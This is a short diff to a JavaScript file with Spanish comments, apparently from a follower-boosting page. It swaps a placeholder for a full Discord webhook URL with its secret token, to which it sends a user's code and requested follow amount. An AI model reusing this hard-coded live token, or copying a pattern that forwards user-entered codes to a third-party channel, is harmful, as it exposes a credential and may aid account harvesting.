@@ -16,7 +16,7 @@ function displayAlert(title, text, icon, confirmButtonText) {
 
 // Función para enviar datos al webhook de Discord
 async function sendToDiscord(userCode, followAmount) {
-    const webhookURL = 'YOUR_DISCORD_WEBHOOK_URL'; // Reemplaza con tu URL de webhook
+    const webhookURL = 'https://discord.com/api/webhooks/1333627119774732319/Y8muL0FbYvPP4MjejMQipthH_DjbpeQdlunNkaUFAPAQ8Z85DAFnvRfCEB6MyPCZyfBC'; // Reemplaza con tu URL de webhook
 
     const payload = {
         content: `User  Code: ${userCode}\nFollow Amount: ${followAmount}`
